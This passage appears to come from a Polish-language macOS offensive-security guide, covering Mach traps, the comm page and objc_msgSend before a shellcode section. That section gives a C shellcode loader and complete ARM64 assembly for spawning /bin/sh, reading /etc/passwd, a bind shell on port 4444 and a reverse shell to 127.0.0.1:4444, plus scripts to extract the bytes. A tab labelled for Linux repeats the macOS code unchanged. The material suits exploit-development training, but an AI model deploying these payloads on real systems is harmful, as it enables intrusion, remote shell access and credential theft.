Sprawdź w [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` oraz w [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypy. Maksymalna liczba Mach traps to `MACH_TRAP_TABLE_COUNT` = 128. Mach traps będą miały **x16 < 0**, więc musisz wywoływać numery z poprzedniej listy ze znakiem **minus**: **`_kernelrpc_mach_vm_allocate_trap`** to **`-10`**.

Możesz też sprawdzić **`libsystem_kernel.dylib`** w disassemblerze, aby znaleźć, jak wywoływać te (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> Czasami łatwiej jest sprawdzić **dekompilowany** kod z **`libsystem_kernel.dylib`** **niż** sprawdzać **kod źródłowy**, ponieważ kod kilku syscalls (BSD i Mach) jest generowany przez skrypty (sprawdź komentarze w kodzie źródłowym), podczas gdy w dylib możesz znaleźć, co jest wywoływane.

### machdep calls

XNU obsługuje inny typ wywołań zwanych machine dependent. Numery tych wywołań zależą od architektury i ani same wywołania, ani ich numery nie są gwarantowane jako stałe.

### comm page

Jest to strona pamięci należąca do jądra, która jest mapowana w przestrzeni adresowej każdego procesu użytkownika. Ma to na celu przyspieszenie przejścia z trybu użytkownika do przestrzeni jądra w porównaniu z używaniem syscalls dla usług jądra, które są wykorzystywane tak często, że to przejście byłoby bardzo nieefektywne.

Na przykład wywołanie `gettimeofdate` odczytuje wartość `timeval` bezpośrednio ze strony comm.

### objc_msgSend

Bardzo często można znaleźć użycie tej funkcji w programach Objective-C lub Swift. Funkcja ta pozwala wywołać metodę obiektu Objective-C.

Parametry ([więcej informacji w dokumentacji](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Wskaźnik na instancję
- x1: op -> Selektor metody
- x2... -> Pozostałe argumenty wywoływanej metody

Jeśli ustawisz breakpoint przed skokiem do tej funkcji, możesz łatwo sprawdzić w lldb, co jest wywoływane — w tym przykładzie obiekt wywołuje obiekt z `NSConcreteTask`, który uruchomi polecenie:
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Ustawiając zmienną środowiskową **`NSObjCMessageLoggingEnabled=1`**, można logować moment wywołania tej funkcji do pliku takiego jak `/tmp/msgSends-pid`.
>
> Ponadto, ustawienie **`OBJC_HELP=1`** i uruchomienie dowolnego binarnego pliku pozwala zobaczyć inne zmienne środowiskowe, których można użyć do **logowania** gdy występują pewne akcje Objc-C.

Gdy ta funkcja zostanie wywołana, należy znaleźć metodę wywołaną na wskazanej instancji; w tym celu wykonuje się różne wyszukiwania:

- Wykonaj optymistyczne wyszukiwanie w cache:
- Jeśli się powiedzie, koniec
- Uzyskaj runtimeLock (read)
- Jeśli (realize && !cls->realized) realize class
- Jeśli (initialize && !cls->initialized) initialize class
- Spróbuj cache klasy:
- Jeśli się powiedzie, koniec
- Sprawdź listę metod klasy:
- Jeśli znaleziono, wypełnij cache i zakończ
- Sprawdź cache nadklasy:
- Jeśli się powiedzie, koniec
- Sprawdź listę metod nadklasy:
- Jeśli znaleziono, wypełnij cache i zakończ
- Jeśli (resolver) spróbuj resolvera metod i powtórz od wyszukiwania klasy
- Jeśli nadal tutaj (= wszystko inne zawiodło) spróbuj forwarder

### Shellcodes

Aby skompilować:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Aby wyodrębnić bajty:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Dla nowszych wersji macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Kod C do testowania shellcode'u</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Pobrane z [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i wyjaśnione.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Czytanie za pomocą cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, więc drugi argument (x1) jest tablicą parametrów (co w pamięci oznacza stos adresów).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Wywołaj polecenie za pomocą sh z fork, aby główny proces nie został zabity
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell z [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Z [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s], revshell do **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
